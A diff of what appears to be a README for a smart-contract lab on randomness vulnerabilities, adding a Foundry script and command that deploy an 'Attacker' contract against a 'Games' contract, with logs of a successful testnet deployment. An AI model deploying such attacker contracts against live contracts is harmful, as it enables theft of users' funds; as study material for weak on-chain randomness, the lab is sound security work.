@@ -172,7 +172,7 @@ Encountered a total of 1 failing tests, 0 tests succeeded
   ![Static Badge](https://img.shields.io/badge/Example1-Green)
 
 - Games ``` try to hack ```
-- 
+  
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
@@ -232,6 +232,73 @@ contract Attacker {
     receive() external payable {}
 }
 ```
+Scripte to deploy attacker contract 
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "../src/Attacker.sol";
+import "../src/Games.sol";
+
+contract DeployAttacker is Script {
+    function run() public {
+        // Replace with the actual address of the deployed Games contract
+        address gamesAddress = vm.envAddress("GAMES_ADDRESS");
+
+        // Start broadcasting transactions
+        vm.broadcast();
+
+        // Deploy the Attacker contract
+        Attacker attacker = new Attacker(gamesAddress);
+
+        // Log the address of the deployed Attacker contract
+        console.log("Attacker deployed to:", address(attacker));
+    }
+}
+```
+Command to deploy script ``` forge script script/DeployAttacker.s.sol:DeployAttacker --rpc-url $RPC_URL_SEPOLIA --private-key $PRIVATE_KEY_AHMED --broadcast -vvv ```
+OUTPUT
+```
+[⠊] Compiling...
+No files changed, compilation skipped
+Script ran successfully.
+
+== Logs ==
+  Attacker deployed to: 0x1732dC14Fc3614FaB3BF99Fe75a3699C261c05cE
+
+## Setting up 1 EVM.
+
+==========================
+
+Chain 11155111
+
+Estimated gas price: 36.56063413 gwei
+
+Estimated total gas used for script: 211783
+
+Estimated amount required: 0.00774292077795379 ETH
+
+==========================
+
+##### sepolia
+✅  [Success] Hash: 0xf1d2a175090dfda2dde21555f74b133dc022d58d92242a1385c770bf2d429ccf
+Contract Address: 0x1732dC14Fc3614FaB3BF99Fe75a3699C261c05cE
+Block: 7492181
+Paid: 0.00352813101090813 ETH (162910 gas * 21.656933343 gwei)
+
+✅ Sequence #1 on sepolia | Total Paid: 0.00352813101090813 ETH (162910 gas * avg 21.656933343 gwei)
+                                                                                                                                      
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
+
+Transactions saved to: /home/mourad/RandomnessVulnerabilities/games/broadcast/DeployAttacker.s.sol/11155111/run-latest.json
+
+Sensitive values saved to: /home/mourad/RandomnessVulnerabilities/games/cache/DeployAttacker.s.sol/11155111/run-latest.json
+```
+
 
 
 
